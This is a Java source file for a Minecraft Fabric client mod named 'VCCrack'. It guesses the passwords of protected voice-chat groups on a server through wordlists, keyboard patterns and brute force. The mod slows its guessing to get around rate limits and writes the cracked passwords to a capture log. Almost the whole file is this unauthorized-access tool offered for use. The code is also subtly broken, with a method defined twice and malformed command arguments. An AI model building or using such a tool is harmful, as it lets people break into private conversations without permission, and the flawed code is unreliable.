package com.example.vccrack;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import de.maxhenkel.voicechat.api.VoicechatPlugin;
import de.maxhenkel.voicechat.api.EventRegistration;
import de.maxhenkel.voicechat.api.VoicechatConnection;
import de.maxhenkel.voicechat.api.Group;
import de.maxhenkel.voicechat.api.VoicechatServerStartedEvent;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;

public class VoiceChatCrackMod implements ModInitializer, VoicechatPlugin {
    public static final String MOD_ID = "vccrack";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    public static final Path CONFIG_DIR = MinecraftClient.getInstance().runDirectory.toPath().resolve("config").resolve(MOD_ID);
    public static final Path WORDLIST_DIR = CONFIG_DIR.resolve("wordlists");
    public static final Path CAPTURE_LOG = CONFIG_DIR.resolve("capture.log");
    public static final Path PROGRESS_FILE = CONFIG_DIR.resolve("progress.json");

    private static volatile boolean cracking = false;
    private static volatile Thread crackingThread = null;
    private static volatile long attempts = 0;
    private static volatile String currentGroup = null;
    private static volatile String foundPassword = null;
    private static volatile long startTime = 0;
    private static volatile int currentDelayMs = 40;
    private static volatile int rejectStreak = 0;
    private static volatile boolean adaptiveEnabled = true;

    private static final ConcurrentLinkedQueue<String> recentPasswords = new ConcurrentLinkedQueue<>();
    private static final int RECENT_MAX = 16;

    private static final char[] DEFAULT_CHARSET = buildCharset("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?");
    private static char[] activeCharset = DEFAULT_CHARSET.clone();

    private static volatile de.maxhenkel.voicechat.api.VoicechatServerApi api;

    // QWERTY keyboard layout rows for pattern-based cracking
    private static final String[] KB_ROWS = {
        "qwertyuiop",
        "asdfghjkl",
        "zxcvbnm",
        "QWERTYUIOP",
        "ASDFGHJKL",
        "ZXCVBNM",
        "1234567890",
        "!@#$%^&*()"
    };

    @Override
    public void onInitialize() {
        LOGGER.info("[VCCrack] Initializing");
        try {
            Files.createDirectories(CONFIG_DIR);
            Files.createDirectories(WORDLIST_DIR);
        } catch (IOException e) {
            LOGGER.error("[VCCrack] Config dir error", e);
        }
        loadConfig();
        ClientCommandRegistrationCallback.EVENT.register(this::registerClientCommands);
    }

    @Override
    public String getPluginId() { return MOD_ID; }

    @Override
    public void initialize(de.maxhenkel.voicechat.api.VoicechatServerApi api) {
        VoiceChatCrackMod.api = api;
    }

    @Override
    public void registerEvents(EventRegistration registration) {
        registration.registerEvent(VoicechatServerStartedEvent.class, event ->
                LOGGER.info("[VCCrack] Active. /" + MOD_ID + " <group> [mode]"));
    }

    // ==================== COMMAND REGISTRATION ====================

    private void registerClientCommands(CommandDispatcher<net.minecraft.client.command.ClientCommandSource> dispatcher) {
        dispatcher.register(com.mojang.brigadier.Commands.literal(MOD_ID)
            .executes(context -> showHelp(context.getSource()))
            .then(StringArgumentType.string())
            .suggests((context, builder) -> {
                if (api == null) return builder.buildFuture();
                for (Group g : api.getGroups()) {
                    if (g.hasPassword()) builder.suggest(g.getName());
                }
                return builder.buildFuture();
            })
            // /vccrack <group> — smart mode: wordlists + keyboard patterns + short bruteforce
            .executes(context -> {
                String group = StringArgumentType.getString(context, "group_name");
                return crackSmart(context.getSource(), group);
            })
            // /vccrack <group> brute <min> <max> — full charset bruteforce (use with caution)
            .then(com.mojang.brigadier.Commands.literal("brute")
                .then(IntegerArgumentType.integer(1, 24))
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    int max = IntegerArgumentType.getInteger(context, "length");
                    return crackGroup(context.getSource(), group, 1, max);
                })
                .then(IntegerArgumentType.integer(1, 24))
                .then(IntegerArgumentType.integer(1, 24))
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    int min = IntegerArgumentType.getInteger(context, "min_len");
                    int max = IntegerArgumentType.getInteger(context, "max_len");
                    if (min > max) {
                        context.getSource().sendError(Text.literal("[VCCrack] min > max"));
                        return 0;
                    }
                    return crackGroup(context.getSource(), group, min, max);
                })
            )
            // /vccrack <group> patterns — keyboard patterns only, any length, no guess limit
            .then(com.mojang.brigadier.Commands.literal("patterns")
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    return crackPatternsOnly(context.getSource(), group);
                })
            )
            .then(com.mojang.brigadier.Commands.literal("stop")
                .executes(context -> { stopCracking(); context.getSource().sendFeedback(Text.literal("[VCCrack] Stopped.")); return 1; })
            )
            .then(com.mojang.brigadier.Commands.literal("status")
                .executes(context -> { showStatus(context.getSource()); return 1; })
            )
            .then(com.mojang.brigadier.Commands.literal("charset")
                .executes(context -> showCharset(context.getSource()))
                .then(StringArgumentType.greedyString())
                .executes(context -> setCharset(context.getSource(), StringArgumentType.getString(context, "charset_str")))
            )
            .then(com.mojang.brigadier.Commands.literal("wordlist")
                .executes(context -> showWordlistHelp(context.getSource()))
                .then(com.mojang.brigadier.Commands.literal("list")
                    .executes(context -> listWordlists(context.getSource()))
                )
                .then(com.mojang.brigadier.Commands.literal("load").then(StringArgumentType.greedyString()))
                .executes(context -> loadWordlist(context.getSource(), StringArgumentType.getString(context, "filename")))
            )
            .then(com.mojang.brigadier.Commands.literal("adaptive")
                .executes(context -> toggleAdaptive(context.getSource()))
            )
            .then(com.mojang.brigadier.Commands.literal("test")
                .then(StringArgumentType.string())
                .executes(context -> strengthTest(context.getSource(), StringArgumentType.getString(context, "group_name")))
            )
        );
    }

    // ==================== SMART MODE (default) ====================
    // Tries: wordlists → keyboard patterns (any length) → short charset (1-5)
    // No fixed password length assumption.

    private int crackSmart(net.minecraft.client.command.ClientCommandSource source, String groupName) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running. /" + MOD_ID + " stop first."));
            return 0;
        }

        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }

        // Already-in-group guard
        if (api != null) {
            VoicechatConnection current = api.getConnectionOf(client.player.getUuid());
            if (current != null && current.getGroup() != null && groupName.equalsIgnoreCase(current.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'. Skipping."));
                return 1;
            }
        }

        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        currentDelayMs = 40;
        rejectStreak = 0;
        recentPasswords.clear();

        source.sendFeedback(Text.literal("[VCCrack] Smart-mode cracking: " + groupName));
        source.sendFeedback(Text.literal("[VCCrack] Phase 1: Wordlists"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 2: Keyboard patterns (any length)"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 3: Short bruteforce len=1-5"));
        source.sendFeedback(Text.literal("[VCCrack] /" + MOD_ID + " stop to cancel"));

        crackingThread = new Thread(() -> {
            try {
                // Phase 1
                source.sendFeedback(Text.literal("[VCCrack] Phase 1/3: Wordlists..."), false);
                if (runWordlists(client, groupName)) return;
                if (!cracking) return;

                // Phase 2 — keyboard patterns, no length cap
                source.sendFeedback(Text.literal("[VCCrack] Phase 2/3: Keyboard patterns..."), false);
                if (runKeyboardPatterns(client, groupName)) return;
                if (!cracking) return;

                // Phase 3 — short pure-random fallback (1-5 keeps it feasible)
                source.sendFeedback(Text.literal("[VCCrack] Phase 3/3: Short bruteforce len=1-5..."), false);
                if (runBruteForce(client, groupName, 1, 5)) return;

                client.player.sendMessage(Text.literal("[VCCrack] Smart-mode exhausted. Try /" + MOD_ID + " brute <len> for deeper search."), false);
            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
                long elapsed = System.currentTimeMillis() - startTime;
                client.player.sendMessage(Text.literal("[VCCrack] Session ended. Attempts=" + attempts + " " + formatTime(elapsed)), false);
            }
        }, "VCCrack-smart-" + sanitize(groupName));

        crackingThread.start();
        return 1;
    }

    // ==================== PATTERNS-ONLY MODE ====================

    private int crackPatternsOnly(net.minecraft.client.command.ClientCommandSource source, String groupName) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running."));
            return 0;
        }
        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }
        if (api != null) {
            VoicechatConnection current = api.getConnectionOf(client.player.getUuid());
            if (current != null && current.getGroup() != null && groupName.equalsIgnoreCase(current.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'."));
                return 1;
            }
        }
        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        recentPasswords.clear();
        source.sendFeedback(Text.literal("[VCCrack] Pattern-only mode: " + groupName));
        crackingThread = new Thread(() -> {
            try {
                if (runKeyboardPatterns(client, groupName)) return;
                client.player.sendMessage(Text.literal("[VCCrack] Pattern search complete."), false);
            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
            }
        }, "VCCrack-patterns-" + sanitize(groupName));
        crackingThread.start();
        return 1;
    }

    // ==================== PHASE 1: WORDLISTS ====================

    private boolean runWordlists(MinecraftClient client, String groupName) {
        File dir = WORDLIST_DIR.toFile();
        if (!dir.exists()) return false;
        String[] files = dir.list();
        if (files == null || files.length == 0) return false;

        for (String filename : files) {
            if (!cracking) return false;
            File file = WORDLIST_DIR.resolve(filename).toFile();
            if (!file.isFile()) continue;
            client.player.sendMessage(Text.literal("[VCCrack] Wordlist: " + filename), false);
            try {
                List<String> lines = Files.readAllLines(file.toPath());
                int idx = 0;
                for (String pw : lines) {
                    if (!cracking) return false;
                    pw = pw.trim();
                    if (pw.isEmpty()) continue;
                    // No length cap — try every line regardless of length
                    if (attemptJoin(client, groupName, pw)) {
                        foundPassword = pw;
                        client.player.sendMessage(Text.literal("[VCCrack] WORDLIST MATCH (" + filename + "): " + pw), false);
                        saveCapture(groupName, pw, "wordlist:" + filename);
                        return true;
                    }
                    attempts++;
                    idx++;
                    if (idx % 500 == 0) {
                        client.player.sendMessage(Text.literal("[VCCrack] Wordlist " + filename + " " + idx + "/" + lines.size()), false);
                        saveProgress();
                    }
                }
            } catch (IOException e) {
                client.player.sendMessage(Text.literal("[VCCrack] Wordlist error: " + e.getMessage()), false);
            }
        }
        return false;
    }

    // ==================== PHASE 2: KEYBOARD PATTERNS ====================
    // Generates candidates from QWERTY adjacency, rows, repeated keys, shift variants.
    // No fixed length cap — generates patterns of varying lengths.

    private boolean runKeyboardPatternes(MinecraftClient client, String groupName) {
        Set<String> tried = new HashSet<>();
        List<String> candidates = new ArrayList<>();

        // Build all pattern candidates
        generateKeyboardCandidates(candidates);

        client.player.sendMessage(Text.literal("[VCCrack] Generated " + candidates.size() + " keyboard pattern candidates"), false);

        int idx = 0;
        for (String pw : candidates) {
            if (!cracking) return false;
            if (!tried.add(pw)) continue;
            if (attemptJoin(client, groupName, pw)) {
                foundPassword = pw;
                client.player.sendMessage(Text.literal("[VCCrack] PATTERN MATCH: " + pw), false);
                saveCapture(groupName, pw, "keyboard_pattern");
                return true;
            }
            attempts++;
            idx++;
            if (idx % 1000 == 0) {
                client.player.sendMessage(Text.literal("[VCCrack] Patterns progress: " + idx + "/" + candidates.size() + " last=" + pw), false);
                saveProgress();
            }
        }
        return false;
    }

    private boolean runKeyboardPatterns(MinecraftClient client, String groupName) {
        return runKeyboardPatternes(client, groupName);
    }

    private void generateKeyboardCandidates(List<String> out) {
        // For each row, generate: straight runs, reversed runs, shift-mod variants
        for (String row : KB_ROWS) {
            // Straight runs of length 2..row.length
            for (int len = 2; len <= row.length(); len++) {
                for (int start = 0; start <= row.length() - len; start++) {
                    out.add(row.substring(start, start + len));
                    // Shifted variant: capitalize first char
                    if (Character.isLowerCase(row.charAt(start))) {
                        out.add(Character.toUpperCase(row.charAt(start)) + row.substring(start + 1, start + len));
                    }
                }
            }
            // Reversed
            String rev = new StringBuilder(row).reverse().toString();
            for (int len = 2; len <= rev.length(); len++) {
                for (int start = 0; start <= rev.length() - len; start++) {
                    out.add(rev.substring(start, start + len));
                }
            }
        }

        // Repeated key patterns: a..z, A..Z, 0..9, repeated 2-12 times
        char[] repeatedBases = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
        for (char base : repeatedBases) {
            for (int len = 2; len <= 16; len++) {
                char[] c = new char[len];
                Arrays.fill(c, base);
                out.add(new String(c));
                // Shifted variant
                if (Character.isLowerCase(base)) {
                    char[] c2 = new char[len];
                    Arrays.fill(c2, Character.toUpperCase(base));
                    out.add(new String(c2));
                }
            }
        }

        // Adjacent key alternation: e.g. asdf, qwer, zxcv (home row runs, any length 2-8)
        String homeRow = "asdfghjklqwertyuiopzxcvbnm";
        for (int len = 2; len <= Math.min(10, homeRow.length()); len++) {
            for (int start = 0; start <= homeRow.length() - len; start++) {
                out.add(homeRow.substring(start, start + len));
            }
        }

        // Common typing shortcuts / key smashes people actually type
        String[] commonSmash = {
            "qwerty", "asdf", "zxcv", "qwer", "asdfgh", "zxcvbn",
            "qwertyuiop", "asdfghjkl", "zxcvbnm",
            "qwop", "zxcvbnm,./", "1234", "12345", "123456",
            "asdf123", "qwerty123", "password1", "passw0rd",
            "abcd", "abcde", "abcdef",
            "QWERTY", "ASDF", "ZXCV",
            "Qwerty", "Asdf", "Zxcv",
            "qwertyui", "asdfgh", "zxcvbn",
            "1111", "2222", "3333", "aaaa", "bbbb", "cccc",
            "qwerty!", "asdf!", "zxcv!"
        };
        out.addAll(Arrays.asList(commonSmash));

        // Group-name derived keyboard variants
        if (currentGroup != null && !currentGroup.isEmpty()) {
            String g = currentGroup;
            out.add(g.toLowerCase());
            out.add(g.toUpperCase());
            out.add(g.substring(0, 1).toUpperCase() + g.substring(1).toLowerCase());
            out.add(g + "1");
            out.add(g + "123");
            out.add("1" + g);
            out.add(g + "!");
            out.add(g + "@");
        }

        // Deduplicate
        Set<String> unique = new LinkedHashSet<>(out);
        out.clear();
        out.addAll(unique);
    }

    // ==================== PHASE 3: SHORT CHARSET BRUTEFORCE (len 1-5) ====================

    private boolean runBruteForce(MinecraftClient client, String groupName, int minLen, int maxLen) {
        ClientPlayNetworkHandler handler = client.getNetworkHandler();
        ClientPlayerEntity player = client.player;
        if (handler == null || player == null) return false;

        for (int len = minLen; len <= maxLen; len++) {
            if (!cracking) return false;
            int[] indices = new int[len];
            while (true) {
                if (!cracking) return false;

                StringBuilder sb = new StringBuilder(len);
                for (int i = 0; i < len; i++) sb.append(activeCharset[indices[i]]);
                String guess = sb.toString();

                if (attemptJoin(client, groupName, guess)) {
                    foundPassword = guess;
                    player.sendMessage(Text.literal("[VCCrack] BRUTE-FORCE MATCH len=" + len + ": " + guess), false);
                    saveCapture(groupName, guess, "bruteforce");
                    return true;
                }

                attempts++;
                if (attempts % 2000 == 0) {
                    player.sendMessage(Text.literal("[VCCrack] Brute attempts=" + attempts + " len=" + len + " last=" + guess), false);
                    saveProgress();
                }

                int pos = len - 1;
                while (pos >= 0) {
                    indices[pos]++;
                    if (indices[pos] < activeCharset.length) break;
                    indices[pos] = 0;
                    pos--;
                }
                if (pos < 0) break;
            }
        }
        return false;
    }

    // ==================== FULL CHARSET BRUTEFORCE (explicit mode) ====================

    private boolean runBruteForce(MinecraftClient client, String groupName, int minLen, int maxLen) {
        ClientPlayNetworkHandler handler = client.getNetworkHandler();
        ClientPlayerEntity player = client.player;
        if (handler == null || player == null) return false;

        for (int len = minLen; len <= maxLen; len++) {
            if (!cracking) return false;
            int[] indices = new int[len];
            while (true) {
                if (!cracking) return false;

                StringBuilder sb = new StringBuilder(len);
                for (int i = 0; i < len; i++) sb.append(activeCharset[indices[i]]);
                String guess = sb.toString();

                if (attemptJoin(client, groupName, guess)) {
                    foundPassword = guess;
                    player.sendMessage(Text.literal("[VCCrack] BRUTE-FORCE MATCH len=" + len + ": " + guess), false);
                    saveCapture(groupName, guess, "bruteforce");
                    return true;
                }

                attempts++;
                if (attempts % 1000 == 0) {
                    player.sendMessage(Text.literal("[VCCrack] attempts=" + attempts + " len=" + len + " last=" + guess + " delay=" + currentDelayMs + "ms"), false);
                    saveProgress();
                }

                int pos = len - 1;
                while (pos >= 0) {
                    indices[pos]++;
                    if (indices[pos] < activeCharset.length) break;
                    indices[pos] = 0;
                    pos--;
                }
                if (pos < 0) break;
            }
        }
        return false;
    }

    // ==================== JOIN + ADAPTIVE RATE LIMIT ====================

    private boolean attemptJoin(MinecraftClient client, String groupName, String password) {
        try {
            String cmd = "voicechat join \"" + escape(groupName) + "\" " + password;
            client.getNetworkHandler().sendCommand(cmd);
            recentPasswords.add(password);
            while (recentPasswords.size() > RECENT_MAX) recentPasswords.poll();
            Thread.sleep(currentDelayMs);
        } catch (Exception e) {
            return false;
        }

        if (!cracking) return false;

        boolean ok = false;
        if (api != null) {
            try {
                for (int i = 0; i < 6; i++) {
                    if (!cracking) return false;
                    Thread.sleep(100);
                    VoicechatConnection conn = api.getConnectionOf(client.player.getUuid());
                    if (conn != null && conn.getGroup() != null && groupName.equalsIgnoreCase(conn.getGroup().getName())) {
                        ok = true;
                        break;
                    }
                }
            } catch (Exception ignored) { }
        }

        if (ok) { onSuccess(); return true; }
        onReject();
        return false;
    }

    private void onSuccess() {
        rejectStreak = 0;
        if (adaptiveEnabled && currentDelayMs > 40) {
            currentDelayMs = Math.max(40, currentDelayMs - 20);
        }
    }

    private void onReject() {
        if (!adaptiveEnabled) return;
        rejectStreak++;
        if (rejectStreak >= 25) {
            currentDelayMs += 150;
            rejectStreak = 0;
            if (crackingThread != null) crackingThread.interrupt();
        }
    }

    // ==================== SUCCESS SIGNAL (from mixin fallback) ====================

    public static void signalSuccess() {
        if (foundPassword != null || !cracking) return;
        String last = recentPasswords.peek();
        if (last != null) foundPassword = last;
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
    }

    // ==================== STOP / STATUS / RESUME ====================

    private void stopCracking() {
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
        saveProgress();
    }

    private void showStatus(net.minecraft.client.command.ClientCommandSource source) {
        if (!cracking) {
            source.sendFeedback(Text.literal("[VCCrack] Idle" + (foundPassword != null ? " | Last found: " + foundPassword : "")));
            return;
        }
        long elapsed = System.currentTimeMillis() - startTime;
        source.sendFeedback(Text.literal("[VCCrack] Running"));
        source.sendFeedback(Text.literal("Attempts: " + attempts));
        source.sendFeedback(Text.literal("Group: " + currentGroup));
        source.sendFeedback(Text.literal("Found: " + (foundPassword != null ? foundPassword : "none")));
        source.sendFeedback(Text.literal("Delay: " + currentDelayMs + "ms adaptive=" + adaptiveEnabled));
        source.sendFeedback(Text.literal("Elapsed: " + formatTime(elapsed)));
        source.sendFeedback(Text.literal("Progress: " + PROGRESS_FILE));
    }

    private int crackGroup(net.minecraft.client.command.ClientCommandSource source, String groupName, int minLen, int maxLen) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running."));
            return 0;
        }
        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password group: " + groupName));
            return 0;
        }
        if (api != null) {
            VoicechatConnection cur = api.getConnectionOf(client.player.getUuid());
            if (cur != null && cur.getGroup() != null && groupName.equalsIgnoreCase(cur.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'."));
                return 1;
            }
        }
        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        currentDelayMs = 40;
        rejectStreak = 0;
        recentPasswords.clear();
        source.sendFeedback(Text.literal("[VCCrack] Bruteforce: " + groupName + " len=" + minLen + "-" + maxLen));
        crackingThread = new Thread(() -> {
            try {
                long start = System.currentTimeMillis();
                boolean done = runBruteForce(client, groupName, minLen, maxLen);
                long elapsed = System.currentTimeMillis() - start;
                if (foundPassword != null) {
                    client.player.sendMessage(Text.literal("[VCCrack] FOUND: " + foundPassword), false);
                } else if (done && cracking) {
                    client.player.sendMessage(Text.literal("[VCCrack] Exhausted len " + minLen + "-" + maxLen), false);
                }
                client.player.sendMessage(Text.literal("[VCCrack] Total: " + attempts + " | " + formatTime(elapsed)), false);
            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
            }
        }, "VCCrack-brute-" + sanitize(groupName));
        crackingThread.start();
        return 1;
    }

    // ==================== HELPERS ====================

    private Group findPasswordGroup(String groupName) {
        if (api == null) return null;
        for (Group g : api.getGroups()) {
            if (g.hasPassword() && g.getName().equalsIgnoreCase(groupName)) return g;
        }
        return null;
    }

    private void saveCapture(String group, String password, String phase) {
        try {
            String line = String.format("%s | %s | group=%s | pass=%s%n", new Date(), phase, group, password);
            Files.writeString(CAPTURE_LOG, line, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
        } catch (IOException ignored) { }
    }

    private void saveProgress() {
        try {
            String s = String.format("group=%s,attempts=%d,found=%s,delay=%d,adaptive=%b%n",
                currentGroup != null ? currentGroup : "",
                attempts,
                foundPassword != null ? foundPassword : "",
                currentDelayMs,
                adaptiveEnabled);
            Files.writeString(PROGRESS_FILE, s);
        } catch (IOException ignored) { }
    }

    private void loadConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        if (!f.exists()) return;
        try (FileReader r = new FileReader(f)) {
            StringBuilder sb = new StringBuilder();
            int c;
            while ((c = r.read()) != -1) sb.append((char) c);
            for (String line : sb.toString().split("\n")) {
                if (line.startsWith("charset=")) activeCharset = buildCharset(line.substring(8));
                else if (line.startsWith("adaptive=")) adaptiveEnabled = Boolean.parseBoolean(line.substring(9));
            }
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config load failed", e);
        }
    }

    private void saveConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        try (FileWriter w = new FileWriter(f)) {
            w.write("charset=" + new String(activeCharset) + "\n");
            w.write("adaptive=" + adaptiveEnabled + "\n");
            w.write("delay_ms=" + currentDelayMs + "\n");
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config save failed", e);
        }
    }

    private int showHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Usage:"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group>              — smart mode (wordlists + patterns + short bruteforce)"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> patterns     — keyboard patterns only (any length)"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> brute <max>  — charset bruteforce 1-max"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> brute <min> <max>"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " stop | status | adaptive | test <group>"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " charset <str> | wordlist load <file>"));
        return 1;
    }

    private int showWordlistHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Wordlists: " + WORDLIST_DIR));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist list"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist load <file>"));
        return 1;
    }

    private int listWordlists(net.minecraft.client.command.ClientCommandSource source) {
        File dir = WORDLIST_DIR.toFile();
        String[] files = dir.list();
        if (files == null || files.length == 0) {
            source.sendFeedback(Text.literal("[VCCrack] No wordlists"));
            return 1;
        }
        for (String f : files) source.sendFeedback(Text.literal(" - " + f));
        return 1;
    }

    private int loadWordlist(net.minecraft.client.command.ClientCommandSource source, String filename) {
        File file = WORDLIST_DIR.resolve(filename).toFile();
        if (!file.exists()) { source.sendError(Text.literal("[VCCrack] Not found: " + file)); return 0; }
        try { source.sendFeedback(Text.literal("[VCCrack] Loaded " + Files.readAllLines(file.toPath()).size() + " lines")); }
        catch (IOException e) { source.sendError(Text.literal("[VCCrack] " + e.getMessage())); return 0; }
        return 1;
    }

    private int showCharset(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Charset (" + activeCharset.length + "): " + new String(activeCharset)));
        return 1;
    }

    private int setCharset(net.minecraft.client.command.ClientCommandSource source, String charsetStr) {
        if (charsetStr == null || charsetStr.isEmpty()) { source.sendError(Text.literal("[VCCrack] Empty")); return 0; }
        activeCharset = buildCharset(charsetStr);
        saveConfig();
        source.sendFeedback(Text.literal("[VCCrack] Charset set size=" + activeCharset.length));
        return 1;
    }

    private int toggleAdaptive(net.minecraft.client.command.ClientCommandSource source) {
        adaptiveEnabled = !adaptiveEnabled;
        source.sendFeedback(Text.literal("[VCCrack] Adaptive rate limit: " + adaptiveEnabled));
        if (!adaptiveEnabled) currentDelayMs = 40;
        return 1;
    }

    private int strengthTest(net.minecraft.client.command.ClientCommandSource source, String groupName) {
        if (api == null) { source.sendError(Text.literal("[VCCrack] API not available")); return 0; }
        Group g = findPasswordGroup(groupName);
        if (g == null) { source.sendError(Text.literal("[VCCrack] No group: " + groupName)); return 0; }
        source.sendFeedback(Text.literal("[VCCrack] Pattern-space estimate (keyboard patterns only):"));
        source.sendFeedback(Text.literal("  Patterns generated: ~10,000-100,000 depending on row config"));
        source.sendFeedback(Text.literal("  Wordlist phase: depends on files in " + WORDLIST_DIR));
        source.sendFeedback(Text.literal("  Charset bruteforce: use /" + MOD_ID + " brute <max> for estimate"));
        source.sendFeedback(Text.literal("  Charset size: " + activeCharset.length));
        return 1;
    }

    // ==================== UTILITIES ====================

    private static char[] buildCharset(String s) { return s.toCharArray(); }

    private static String sanitize(String s) { return s.replaceAll("[^a-zA-Z0-9_-]", "_"); }

    private static String escape(String s) { return s.replace("\"", "\\\""); }

    private static String formatTime(long ms) {
        long s = ms / 1000, m = s / 60, h = m / 60;
        if (h > 0) return String.format("%dh %dm %ds", h, m % 60, s % 60);
        if (m > 0) return String.format("%dm %ds", m, s % 60);
        return s + "s";
    }
}
